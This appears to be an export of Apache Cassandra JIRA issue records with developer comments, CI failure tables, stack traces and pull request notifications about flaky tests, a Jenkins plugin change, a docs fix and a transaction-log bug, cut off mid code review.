{{void testTokenGenerations()}} was timing out due to this pretty beastly nesting of different permutations it runs combined with it logging output, etc. Effectively we have to run 1600 tests in 900 seconds sans whatever the other tests were consuming for time, and with all the logging about tokens and iteration through it looks like we tipped over an edge.

I pared the test down to the following (about a third of the combinations with what I think is *logically* comparably useful coverage):
{code:java}
    private final int[] racks = { 1, 2, 3, 5, 6, 9, 10 };
    private final int[] rfs = { 1, 2, 3, 5 };
    private final int[] tokens = { 1, 2, 3, 5, 6, 9, 10, 13, 15, 16 };
{code}
I toyed with getting rid of the logging inside the test class but the lion's share of what's spamming is in a variety of other classes. I also looked into disabling logging in the {{SystemOutputImpl}} in {{OfflineTokenAllocatorTestUtils}} but that ended up being more pain than it was worth.

Rather than taking 15+ minutes and timing out my laptop it takes about 20 seconds; should be ok in our CI env. Also split out this test method to its own file entirely so it doesn't stomp on the other offline token allocation tests and throw a red herring of timeout like this did (parallelization and method timeouts within a class are... not fun).
 ;;;","19/May/22 21:12;dcapwell;change LGTM but the new test class doesn't end in Test so it doesn't run in CI; once that is fixed I am +1;;;","20/May/22 14:55;jmckenzie;bq. the new test class doesn't end in Test
Blargh! It's always something. :)

Figured I'd multiplex both the classes for 100 runs as well just to double check they're solid; I'll do that, fix the file name, and assuming all green, merge in.

Thanks [~dcapwell]!;;;","23/May/22 17:04;jmckenzie;Multiplex on both tests looked clean; merged up.;;;","24/May/22 14:42;jmckenzie;[CI Results]
Branch: 4.1, build number: 35
   butler url: https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1
   jenkins url: https://ci-cassandra.apache.org/job/Cassandra-4.1/35/
   JIRA: CASSANDRA-17291
   commit url: https://git-wip-us.apache.org/repos/asf?p=cassandra.git;a=commit;h=951aff25a1183f41fd146d674136399f3f25b3f0
   affected paths:
* test/unit/org/apache/cassandra/dht/tokenallocator/OfflineTokenAllocatorGenerationsTest.java
* test/unit/org/apache/cassandra/dht/tokenallocator/OfflineTokenAllocatorTestUtils.java
* test/unit/org/apache/cassandra/dht/tokenallocator/OfflineTokenAllocatorTest.java

   Build Result: UNSTABLE
   Passing Tests: 47094
   Failing Tests: 27

||Test|Failures|JIRA||
|org.apache.cassandra.cql3.validation.operations.CompactStorageTest.testCounterAndColumnSelection|1 of 33|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityV30Test.testAvailability|5 of 33|[CASSANDRA-17307?|https://issues.apache.org/jira/browse/CASSANDRA-17307]|
|org.apache.cassandra.distributed.test.SchemaTest.readRepairWithCompaction|4 of 33|[CASSANDRA-17641?|https://issues.apache.org/jira/browse/CASSANDRA-17641]|
|org.apache.cassandra.distributed.test.MessageForwardingTest.mutationsForwardedToAllReplicasTest|1 of 33|[CASSANDRA-17583?|https://issues.apache.org/jira/browse/CASSANDRA-17583]|
|org.apache.cassandra.cql3.validation.operations.CompactStorageTest.testAlterWithCompactNonStaticFormat|2 of 33|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.test.ring.BootstrapTest.readWriteDuringBootstrapTest|3 of 33|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20""*BootstrapTest*""]
|org.apache.cassandra.distributed.upgrade.CompactStorageUpgradeTest.compactStorageImplicitNullInClusteringTest|5 of 33|[CASSANDRA-17213?|https://issues.apache.org/jira/browse/CASSANDRA-17213]|
|junit.framework.TestSuite.org.apache.cassandra.distributed.test.CASMultiDCTest|2 of 33|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20""*test*""]
|dtest-upgrade.upgrade_tests.drop_compact_storage_upgrade_test.TestDropCompactStorage.test_drop_compact_storage_mixed_cluster|4 of 33|[CASSANDRA-17634?|https://issues.apache.org/jira/browse/CASSANDRA-17634]|
|org.apache.cassandra.tools.TopPartitionsTest.testServiceTopPartitionsSingleTable-cdc|5 of 33|[CASSANDRA-17649?|https://issues.apache.org/jira/browse/CASSANDRA-17649]|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexOnRegularColumnInsertExpiringColumnWithFlush|3 of 33|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.operations.CompactStorageTest.testStaticCompactWithCounters|2 of 33|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.upgrade.BatchUpgradeTest.batchTest|6 of 33|[CASSANDRA-17651?|https://issues.apache.org/jira/browse/CASSANDRA-17651]|
|org.apache.cassandra.cql3.ViewFilteringClustering1Test.testClusteringKeySliceRestrictions[3]|6 of 33|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV4Upgrade_AllVersions_EndsAt_Trunk_HEAD.test_parallel_upgrade|1 of 33|[CASSANDRA-17296?|https://issues.apache.org/jira/browse/CASSANDRA-17296]|
|org.apache.cassandra.cql3.validation.operations.SelectTest.filteringWithOrderClause|3 of 33|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexOnNonFrozenCollectionOfFrozenUDT|1 of 33|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.upgrade.CompactStorageUpgradeTest.compactStoragePagingTest|3 of 33|[CASSANDRA-17213?|https://issues.apache.org/jira/browse/CASSANDRA-17213]|
|org.apache.cassandra.db.VerifyTest.testMutateRepair-cdc|1 of 33|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestUpgrade_current_4_0_x_To_indev_4_1_x.test_parallel_upgrade_with_internode_ssl|1 of 33|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20""*TestUpgrade*""]
|org.apache.cassandra.distributed.test.CASTest.testIncompleteWriteFollowedBySuccessfulWriteWithStaleRingDuringRangeMovementFollowedByRead|1 of 33|[CASSANDRA-17461?|https://issues.apache.org/jira/browse/CASSANDRA-17461]|
|org.apache.cassandra.db.virtual.GossipInfoTableTest.testSelectAllWithStateTransitions|1 of 33|[CASSANDRA-17584?|https://issues.apache.org/jira/browse/CASSANDRA-17584]|
|org.apache.cassandra.distributed.upgrade.CompactStorageUpgradeTest.compactStorageColumnDeleteTest|3 of 33|[CASSANDRA-17213?|https://issues.apache.org/jira/browse/CASSANDRA-17213]|
|org.apache.cassandra.cql3.ViewComplexTTLTest.testUnselectedColumnsTTLWithFlush[3]|1 of 33|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|dtest-offheap.cqlsh_tests.test_cqlsh_copy.TestCqlshCopy.test_round_trip_with_rate_file|1 of 33|[CASSANDRA-17322?|https://issues.apache.org/jira/browse/CASSANDRA-17322]|
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"In Jenkins, replace PostBuildTask plugin with PostBuildScript plugin",CASSANDRA-17288,13424687,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,mck,mck,mck,25/Jan/22 13:03,25/Jan/22 14:58,13/Jul/23 08:40,25/Jan/22 13:08,NA,,,,,,CI,,,,0,,"PostbuildTask loads the build log into memory, causing OutOfMemoryException.
https://issues.jenkins.io/browse/JENKINS-12830

We started hitting this problem this week, see discussion here:
https://the-asf.slack.com/archives/CK23JSY2K/p1643063068079200?thread_ts=1643052183.068300&cid=CK23JSY2K

Fix is to use the PostBuildTask plugin instead, which does not perform any reading off or matching on the build log.

PR: https://github.com/apache/cassandra-builds/pull/61
",,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,mck,,,,,,,,,,,,,,Degradation -> Resource Management,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Jan 25 14:58:27 UTC 2022,,,,,,,All,,,,"0|z0yxj4:",9223372036854775807,,,,brandon.williams,,,,Critical,,NA,,https://github.com/apache/cassandra-builds/commit/ef3c02e0b99a14079c251474d3bdeeb6a6df9a25 https://github.com/apache/cassandra-builds/commit/41150e09526c335c0713f4b48991e671211dd6e5,,,,,,,,,see PR (local and ci-cassandra.a.o),,,,,"25/Jan/22 13:04;brandon.williams;+1 ;);;;","25/Jan/22 13:08;mck;Committed with [https://github.com/apache/cassandra-builds/commit/ef3c02e0b99a14079c251474d3bdeeb6a6df9a25|https://github.com/apache/cassandra-builds/commit/ef3c02e0b99a14079c251474d3bdeeb6a6df9a25].;;;","25/Jan/22 13:10;mck;(also doc update: https://github.com/apache/cassandra-website/commit/d31287a8d0a46512147d3cc81e5b83ff3d7e6e76 );;;","25/Jan/22 14:58;mck;Second attempt [41150e09526c335c0713f4b48991e671211dd6e5|https://github.com/apache/cassandra-builds/commit/41150e09526c335c0713f4b48991e671211dd6e5].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failure: org.apache.cassandra.db.lifecycle.LogTransactionTest.testGetTemporaryFilesSafeAfterObsoletion-cdc,CASSANDRA-17286,13424512,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jonmeredith,jmckenzie,jmckenzie,24/Jan/22 20:50,14/May/22 01:10,13/Jul/23 08:40,23/Mar/22 00:54,4.0.4,,,,,,Test/unit,,,,0,,"Looks like it's a straight up flaky test:

 

[https://ci-cassandra.apache.org/job/Cassandra-trunk/899/testReport/org.apache.cassandra.db.lifecycle/LogTransactionTest/testGetTemporaryFilesSafeAfterObsoletion_cdc/]

 
Failed 3 times in the last 17 runs. Flakiness: 31%, Stability: 82%
h3. Error Message

java.nio.file.NoSuchFileException: /home/cassandra/cassandra/build/test/cassandra/data/TransactionLogsTest/mockcf33-ed510f6070ca11ecbc8a25a710ea09dc/nb-0-big-Data.db
h3. Stacktrace

java.io.UncheckedIOException: java.nio.file.NoSuchFileException: /home/cassandra/cassandra/build/test/cassandra/data/TransactionLogsTest/mockcf33-ed510f6070ca11ecbc8a25a710ea09dc/nb-0-big-Data.db at org.apache.cassandra.io.util.PathUtils.propagateUnchecked(PathUtils.java:695) at org.apache.cassandra.io.util.PathUtils.toRealPath(PathUtils.java:514) at org.apache.cassandra.io.util.PathUtils.toCanonicalPath(PathUtils.java:502) at org.apache.cassandra.io.util.File.toCanonical(File.java:411) at java.base/java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:195) at java.base/java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1655) at java.base/java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:484) at java.base/java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:474) at java.base/java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:913) at java.base/java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234) at java.base/java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:578) at org.apache.cassandra.db.lifecycle.LogTransactionTest.listFiles(LogTransactionTest.java:1333) at org.apache.cassandra.db.lifecycle.LogTransactionTest.getTemporaryFiles(LogTransactionTest.java:1317) at org.apache.cassandra.db.lifecycle.LogTransactionTest.testGetTemporaryFilesSafeAfterObsoletion(LogTransactionTest.java:1182) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) Caused by: java.nio.file.NoSuchFileException: /home/cassandra/cassandra/build/test/cassandra/data/TransactionLogsTest/mockcf33-ed510f6070ca11ecbc8a25a710ea09dc/nb-0-big-Data.db at java.base/sun.nio.fs.UnixException.translateToIOException(UnixException.java:92) at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:111) at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:116) at java.base/sun.nio.fs.UnixPath.toRealPath(UnixPath.java:860) at org.apache.cassandra.io.util.PathUtils.toRealPath(PathUtils.java:510)",,jmckenzie,jonmeredith,maedhroz,,,,,,,,,,,,"jonmeredith opened a new pull request #1519:
URL: https://github.com/apache/cassandra/pull/1519


   See [CASSANDRA-17286](https://issues.apache.org/jira/browse/CASSANDRA-17286)


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;22/Mar/22 19:32;githubbot;600","jonmeredith commented on pull request #1519:
URL: https://github.com/apache/cassandra/pull/1519#issuecomment-1075801317


   Committed.


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;23/Mar/22 01:03;githubbot;600","jonmeredith closed pull request #1519:
URL: https://github.com/apache/cassandra/pull/1519


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;23/Mar/22 01:03;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1800,,,0,1800,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jonmeredith,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Low Hanging Fruit,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Mar 22 21:57:35 UTC 2022,,,,,,,All,,,,"0|z0ywh4:",9223372036854775807,,,,jmckenzie,,,,Low,,4.1,,https://github.com/apache/cassandra/commit/4dd0e2391a5adda7fe091cb4e85bd5e648760f78,,,,,,,,,Modified test to tolerate expected race between listing and accessing file.,,,,,"22/Mar/22 19:36;jonmeredith;Fault due to concurrently listing a directory followed by operations on the files while files are being removed concurrently.

Modify listFiles to ignore NoSuchFileExceptions on the stream of listed files.

[Branch|https://github.com/jonmeredith/cassandra/tree/C17286-trunk]
[PR|https://github.com/apache/cassandra/pull/1519]
[CircleCI|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=C17286-trunk&filter=all];;;","22/Mar/22 19:40;jmckenzie;+1;;;","22/Mar/22 21:57;jonmeredith;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|trunk|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17286-trunk-E28E66B8-C13F-4E4E-904A-B1F1602587F8]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17286-trunk-E28E66B8-C13F-4E4E-904A-B1F1602587F8]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1534/]|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failing test: UNIT org.apache.cassandra.tools.BulkLoaderTest.testBulkLoader_WithArgs1,CASSANDRA-17283,13424490,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,jmckenzie,jmckenzie,24/Jan/22 19:11,27/May/22 19:25,13/Jul/23 08:40,17/Feb/22 06:40,4.1,4.1-alpha1,,,,,Test/unit,,,,0,,"Intermittent failure: [https://butler.cassandra.apache.org/#/ci/upstream/workflow/Cassandra-trunk/failure/org.apache.cassandra.tools/BulkLoaderTest/testBulkLoader_WithArgs1]
h3. Error Message

Wrong thread status, active threads unaccounted for: [cluster2-connection-reaper-0]
h3. Stacktrace

junit.framework.AssertionFailedError: Wrong thread status, active threads unaccounted for: [cluster2-connection-reaper-0] at org.apache.cassandra.tools.OfflineToolUtils.assertNoUnexpectedThreadsStarted(OfflineToolUtils.java:106) at org.apache.cassandra.tools.BulkLoaderTest.testBulkLoader_WithArgs1(BulkLoaderTest.java:85) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
h3. Standard Output

DEBUG [main] 2022-01-21 19:11:46,606 InternalLoggerFactory.java:63 - Using SLF4J as the default logging framework DEBUG [main] 2022-01-21 19:11:46,634 PlatformDependent0.java:417 - -Dio.netty.noUnsafe: false DEBUG [main] 2022-01-21 19:11:46,634 PlatformDependent0.java:897 - Java version: 8 DEBUG [main] 2022-01-21 19:11:46,636 PlatformDependent0.java:130 - sun.misc.Unsafe.theUnsafe: available DEBUG [main] 2022-01-21 19:11:46,636 PlatformDependent0.java:154 - sun.misc.Unsafe.copyMemory: available",,bereng,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Feb 16 18:14:55 UTC 2022,,,,,,,All,,,,"0|z0ywc8:",9223372036854775807,,,,bereng,brandon.williams,,,Normal,,4.1,,https://github.com/apache/cassandra/commit/a725d2c4c8ca6d0e914d3dce3ea90ae495fca2c8,,,,,,,,,See PR,,,,,"15/Feb/22 11:06;bereng;I also found:

bq. Wrong thread status, active threads unaccounted for: [Shutdown-checker]
bq. Wrong thread status, active threads unaccounted for: [cluster3-connection-reaper-0]

Where the first one googling a bit seems to be some jdk thread. The cluster connection reapears from the C* driver. They both seems benign and probably the fix is to add them to the list of exclusion of threads to check. These come up as we're invoking the _class_ directly, not the _tool_. Need to look a bit more though.
;;;","16/Feb/22 18:14;brandon.williams;Looks good and the multiplexer doesn't lie, +1.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
FAQ page contains bullet list of div tags,CASSANDRA-17275,13423983,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,adhogg,adhogg,adhogg,21/Jan/22 10:30,16/Dec/22 21:54,13/Jul/23 08:40,08/Jul/22 10:35,3.11.14,4.0.5,4.1,4.1-beta1,5.0,,Documentation,Documentation/Website,,,0,,"Within the versioned documentation, the FAQ page has a bullet list at the top which relates to the div's within the layout that is used for navigation. This bullet list is not a set of hyperlinks / clickable, they are just shown.",,adhogg,mck,,,,,,,,,,,,,"AndrewHogg opened a new pull request #1418:
URL: https://github.com/apache/cassandra/pull/1418


   Removing superfluous list of bullet points which relate to div tags within the document.
   
   patch by Andrew Hogg; for CASSANDRA-17275


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;21/Jan/22 10:47;githubbot;600","michaelsembwever commented on PR #1418:
URL: https://github.com/apache/cassandra/pull/1418#issuecomment-1178829660

   Merged with https://github.com/apache/cassandra/commit/ef6bce50842fa3dc0563603ff46e03df9749a678 


;08/Jul/22 10:33;githubbot;600","michaelsembwever closed pull request #1418: CASSANDRA-17275 : FAQ page contains bullet list of div tags
URL: https://github.com/apache/cassandra/pull/1418


;08/Jul/22 10:33;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1800,,,0,1800,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Jan/22 10:28;adhogg;Screenshot 2022-01-21 at 10.28.16.png;https://issues.apache.org/jira/secure/attachment/13039215/Screenshot+2022-01-21+at+10.28.16.png",,,,,1.0,adhogg,,,,,,,,,,,,,,Documentation,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,Docs,,Sat Jul 09 15:26:55 UTC 2022,,,,,,,All,,,,"0|z0yt7k:",9223372036854775807,,,,mck,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/ef6bce50842fa3dc0563603ff46e03df9749a678,,,,,,,,,Website was built using : ./run.sh website build -g -b cassandra:cassandra-3.11 -u cassandra:/andrewhogg-cassandra and manually inspected.,,,,,"21/Jan/22 10:49;adhogg;Pull request opened : [https://github.com/apache/cassandra/pull/1418]

This change will apply to 3.11, 4.0 and trunk.;;;","08/Jul/22 10:35;mck;Committed as [ef6bce50842fa3dc0563603ff46e03df9749a678|https://github.com/apache/cassandra/commit/ef6bce50842fa3dc0563603ff46e03df9749a678].;;;","08/Jul/22 18:00;mck;[~adhogg], is looking at you expect? https://cassandra.staged.apache.org/doc/latest/cassandra/faq/index.html ;;;","09/Jul/22 14:55;adhogg;[~mck] - looks good;;;","09/Jul/22 15:26;mck;cassandra.a.o updated.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Lazy transaction log replica creation allows incorrect replica content divergence during compaction,CASSANDRA-17273,13423867,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,marcuse,maedhroz,maedhroz,20/Jan/22 22:49,27/May/22 19:24,13/Jul/23 08:40,16/Feb/22 10:22,3.0.27,3.11.13,4.0.4,4.1,4.1-alpha1,,Consistency/Repair,Local/Compaction,,,0,,"Recently encountered this around compaction/anticompaction:

{noformat}
2022-01-13 10:18:24,325 ERROR [main] org.apache.cassandra.db.lifecycle.LogTransaction - Unexpected disk state: failed to read transaction log [mf_txn_anticompactionafterrepair_2f826324-742c-11ec-b293-65cae21e111c.log in .../d1/data/.../files-c351f12917af3a5cbc57791cdf178a1f, .../d2/data/.../files-c351f12917af3a5cbc57791cdf178a1f]
Files and contents follow:
.../d1/data/.../files-c351f12917af3a5cbc57791cdf178a1f/mf_txn_anticompactionafterrepair_2f826324-742c-11ec-b293-65cae21e111c.log
	ADD:[.../d2/data/.../files-c351f12917af3a5cbc57791cdf178a1f/prod_p203-files-mf-350438-big,0,8][2380834168]
	REMOVE:[.../d2/data/.../files-c351f12917af3a5cbc57791cdf178a1f/prod_p203-files-mf-350435-big,1642049328006,8][2338829485]
	REMOVE:[.../d1/data/.../files-c351f12917af3a5cbc57791cdf178a1f/prod_p203-files-mf-350436-big,1642049366291,8][4248366924]
	COMMIT:[,0,0][2613697770]
.../d2/data/.../files-c351f12917af3a5cbc57791cdf178a1f/mf_txn_anticompactionafterrepair_2f826324-742c-11ec-b293-65cae21e111c.log
	ADD:[.../d2/data/.../files-c351f12917af3a5cbc57791cdf178a1f/prod_p203-files-mf-350437-big,0,8][4051162457]
		***Does not match <ADD:[.../d2/data/.../files-c351f12917af3a5cbc57791cdf178a1f/prod_p203-files-mf-350438-big,0,8][2380834168]> in first replica file
	ADD:[.../d2/data/.../files-c351f12917af3a5cbc57791cdf178a1f/prod_p203-files-mf-350438-big,0,8][2380834168]
	REMOVE:[.../d2/data/.../files-c351f12917af3a5cbc57791cdf178a1f/prod_p203-files-mf-350435-big,1642049328006,8][2338829485]
	REMOVE:[.../d1/data/.../files-c351f12917af3a5cbc57791cdf178a1f/prod_p203-files-mf-350436-big,1642049366291,8][4248366924]
	COMMIT:[,0,0][2613697770]
{noformat}

We have two data directories and two transaction log files, but one is missing an ADD entry when the contents of the two log replicas should be identical. One scenario that can cause this is the following:

1. Start anticompaction on a single file, in directory {{/tmp/d0}}.

2. Call {{trackNew()}} with 2 new files, both in a single directory, but in directory {{/tmp/d1}}. This initializes the log file in {{/tmp/d1}}, but there is still no log file in {{/tmp/d0}}.

3. Anticompaction only writes to one of the files in {{/tmp/d1}} (say all other keys were outside the repaired range).

4. When anticompaction is done, the empty writer is aborted and we call {{untrackNew()}}, which removes the added file from the registered log “records"" (BUT NOT FROM DISK in {{/tmp/d1}}).

5. The REMOVE record is added. This references {{/tmp/d0}}. We lazily create the log file there by dumping all the records we have in memory to that file, which does not include the aborted SSTable above.

6. Now the log files contain:

{noformat}
/tmp/d1/logfile.log:
ADD:[/tmp/d1/AntiCompactionTest/AntiCompactionTest-e4fdddf0746e11ecb73ad5a997381615/AntiCompactionTest-AntiCompactionTest-mf-2-big,0,8][3268492367]
ADD:[/tmp/d1/AntiCompactionTest/AntiCompactionTest-e4fdddf0746e11ecb73ad5a997381615/AntiCompactionTest-AntiCompactionTest-mf-3-big,0,8][2813724425]
REMOVE:[/tmp/d0/AntiCompactionTest/AntiCompactionTest-e4fdddf0746e11ecb73ad5a997381615/AntiCompactionTest-AntiCompactionTest-mf-1-big,1642078019000,8][2401235379]
COMMIT:[,0,0][2613697770]
** /tmp/d0/logfile.log:
ADD:[/tmp/d1/AntiCompactionTest/AntiCompactionTest-e4fdddf0746e11ecb73ad5a997381615/AntiCompactionTest-AntiCompactionTest-mf-3-big,0,8][2813724425]
REMOVE:[/tmp/d0/AntiCompactionTest/AntiCompactionTest-e4fdddf0746e11ecb73ad5a997381615/AntiCompactionTest-AntiCompactionTest-mf-1-big,1642078019000,8][2401235379]
COMMIT:[,0,0][2613697770]
{noformat}",,maedhroz,marcuse,,,,,,,,,,,,,"maedhroz commented on a change in pull request #1417:
URL: https://github.com/apache/cassandra/pull/1417#discussion_r794014691



##########
File path: test/unit/org/apache/cassandra/db/lifecycle/LogTransactionTest.java
##########
@@ -25,6 +25,7 @@
 import java.util.*;
 import java.util.function.BiConsumer;
 import java.util.function.Consumer;
+import java.util.function.Function;

Review comment:
       nit: unused
   
   In general, the imports are a little wacky here w/ the static in the middle :/




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;27/Jan/22 21:31;githubbot;600","maedhroz commented on a change in pull request #1417:
URL: https://github.com/apache/cassandra/pull/1417#discussion_r794016568



##########
File path: test/unit/org/apache/cassandra/db/lifecycle/LogTransactionTest.java
##########
@@ -222,6 +224,37 @@ public void testUntrack() throws Throwable
         assertFiles(dataFolder.getPath(), Collections.<String>emptySet());
     }
 
+    @Test
+    public void testUntrackIdenticalLogFilesOnDisk() throws Throwable
+    {
+        ColumnFamilyStore cfs = MockSchema.newCFS(KEYSPACE);
+        File datadir1 = Files.createTempDirectory(""datadir1"").toFile();
+        File datadir2 = Files.createTempDirectory(""datadir2"").toFile();
